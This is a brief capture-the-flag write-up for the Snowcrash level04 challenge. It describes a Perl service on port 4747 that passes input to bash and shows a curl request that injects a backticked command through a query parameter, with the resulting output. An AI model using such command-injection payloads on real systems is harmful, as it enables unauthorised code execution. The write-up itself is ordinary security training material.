# Snowcrash04

There's a perl file in our home indicating that a server is listening on 4747
it calls bash code, let's inject

```sh
level04:~$ curl localhost:4747?x='`getflag`'
Check flag.Here is your token : REDACTED
```

That was easy